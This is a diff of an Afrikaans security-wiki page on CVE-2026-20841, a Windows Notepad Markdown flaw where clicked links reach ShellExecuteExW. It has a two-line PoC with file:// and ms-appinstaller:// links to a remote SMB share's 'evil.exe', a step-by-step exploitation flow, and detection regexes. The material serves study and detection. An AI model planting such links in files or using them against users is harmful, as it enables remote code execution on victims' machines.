@@ -1,47 +1,47 @@
-# Windows-protokolhandtekenaar / ShellExecute-misbruik (Markdown-renderers)
+# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)
 
 {{#include ../banners/hacktricks-training.md}}
 
-Moderne Windows-toepassings wat Markdown/HTML render, omskep dikwels deur gebruikers aangeleverde skakels in klikbare elemente en gee dit aan `ShellExecuteExW`. Sonder streng skema-allowlisting kan enige geregistreerde protokolhandtekenaar (bv. `file:`, `ms-appinstaller:`) geaktiveer word, wat tot kode-uitvoering in die huidige gebruikerskonteks kan lei.
+Moderne Windows-toepassings wat Markdown/HTML weergee, verander dikwels skakels wat deur gebruikers verskaf word in klikbare elemente en stuur dit na `ShellExecuteExW`. Sonder streng allowlisting van skemas kan enige geregistreerde protocol handler (bv. `file:`, `ms-appinstaller:`) geaktiveer word, wat tot code execution in die huidige gebruiker se konteks kan lei.<sup>[[1]](#references)</sup>
 
-## ShellExecuteExW surface in Windows Notepad Markdown mode
-- Notepad kies Markdown-modus **slegs vir `.md`-uitbreidings** deur 'n vaste stringvergelyking in `sub_1400ED5D0()`.
+## ShellExecuteExW-oppervlak in Windows Notepad se Markdown-modus
+- Notepad kies Markdown-modus **slegs vir `.md`-uitbreidings** deur middel van ’n vaste stringvergelyking in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
 - Ondersteunde Markdown-skakels:
 - Standard: `[text](target)`
-- Autolink: `<target>` (gerender as `[target](target)`), so beide sintakse is van belang vir payloads en detections.
-- Skakelklikke word verwerk in `sub_140170F60()`, wat swak filtering uitvoer en daarna `ShellExecuteExW` aanroep.
-- `ShellExecuteExW` stuur aan **enige geconfigureerde protokolhandtekenaar**, nie net HTTP(S) nie.
+- Autolink: `<target>` (weergegee as `[target](target)`), dus is albei sintakse belangrik vir payloads en detection.
+- Daar word na skakelklikke verwerk in `sub_140170F60()`, wat swak filtering uitvoer en daarna `ShellExecuteExW` aanroep.
+- `ShellExecuteExW` stuur versoeke na **enige gekonfigureerde protocol handler**, nie net HTTP(S) nie.<sup>[[1]](#references)</sup>
 
-### Payload considerations
-- Enige `\\` patrone in die skakel word **genormaliseer na `\`** voor `ShellExecuteExW`, wat UNC/pad-skepping en detection raak.
-- `.md`-lêers is **nie standaard met Notepad geassosieer nie**; die slagoffer moet steeds die lêer in Notepad oopmaak en op die skakel klik, maar sodra dit gerender is, is die skakel klikbaar.
-- Gevaarlike voorbeeldskemas:
-- `file://` om 'n plaaslike/UNC payload te begin.
-- `ms-appinstaller://` om App Installer flows te aktiveer. Ander plaaslik geregistreerde skemas kan ook misbruikbaar wees.
+### Payload-oorwegings
+- Enige `\\`-reekse in die skakel word **genormaliseer na `\`** voordat `ShellExecuteExW` uitgevoer word, wat UNC-/padkonstruksie en detection beïnvloed.
+- `.md`-lêers word **nie by verstek met Notepad geassosieer nie**; die slagoffer moet steeds die lêer in Notepad oopmaak en op die skakel klik, maar sodra dit weergegee is, is die skakel klikbaar.
+- Gevaarlike voorbeeldskemas:<sup>[[1]](#references)</sup>
+- `file://` om ’n plaaslike/UNC-payload te begin.
+- `ms-appinstaller://` om App Installer-vloeie te aktiveer. Ander plaaslik geregistreerde skemas kan ook misbruik word.
 
 ### Minimal PoC Markdown
 ```markdown
 [run](file://\\192.0.2.10\\share\\evil.exe)
 <ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
 ```
-### Uitbuitingsvloei
-1. Skep 'n **`.md` file** sodat Notepad dit as Markdown weergee.
-2. Voeg 'n skakel in wat 'n gevaarlike URI-skema gebruik (`file:`, `ms-appinstaller:`, of enige geïnstalleerde handler).
-3. Lewer die lêer (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB of soortgelyk) en oortuig die gebruiker om dit in Notepad oop te maak.
-4. Wanneer geklik word, word die **genormaliseerde skakel** aan `ShellExecuteExW` gegee en die ooreenstemmende protokolhandler voer die verwysde inhoud in die gebruiker se konteks uit.
+### Exploitation-vloei
+1. Skep ’n **`.md`-lêer** sodat Notepad dit as Markdown weergee.
+2. Bed die skakel in met ’n gevaarlike URI-skema (`file:`, `ms-appinstaller:`, of enige geïnstalleerde handler).
+3. Lewer die lêer af (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB of soortgelyk) en oortuig die gebruiker om dit in Notepad oop te maak.
+4. Wanneer daarop geklik word, word die **genormaliseerde skakel** aan `ShellExecuteExW` oorhandig, en die ooreenstemmende protocol handler voer die verwysde inhoud binne die gebruiker se konteks uit.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## Opsporingsideeë
-- Moniteer oordragte van `.md`-lêers oor poorte/protokolle wat gewoonlik dokumente lewer: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
-- Parseer Markdown-skakels (standard en autolink) en soek na **ongevoelig vir hoof- en kleinletters** `file:` of `ms-appinstaller:`.
-- Verskaffer-geleide regexes om toegang tot afgeleë hulpbronne op te vang:
+## Opsporingsidees
+- Monitor oordragte van `.md`-lêers oor poorte/protokolle wat algemeen gebruik word om dokumente af te lewer: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
+- Ontleed Markdown-skakels (standaard en autolink) en soek na **hoofletter-onsensitiewe** `file:` of `ms-appinstaller:`.
+- Regexes volgens Vendor-riglyne om toegang tot afgeleë hulpbronne op te spoor:
 ```
 (\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
 (\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
 ```
-- Volgens berigte laat die patchgedrag **allowlists local files and HTTP(S)** toe; enigiets anders wat `ShellExecuteExW` bereik, is verdag. Brei opsporings uit na ander geïnstalleerde protokolbehandelaars waar nodig, aangesien die aanvaloppervlak per stelsel verskil.
+- Die gedrag van die patch laat glo **plaaslike lêers en HTTP(S) toe via ’n allowlist**; enigiets anders wat `ShellExecuteExW` bereik, is verdag. Brei opsporing uit na ander geïnstalleerde protocol handlers soos nodig, aangesien die attack surface per stelsel verskil.<sup>[[1]](#references)</sup>
 
 ## Verwysings
-- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
-- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
+- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
+- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
 
 {{#include ../banners/hacktricks-training.md}}
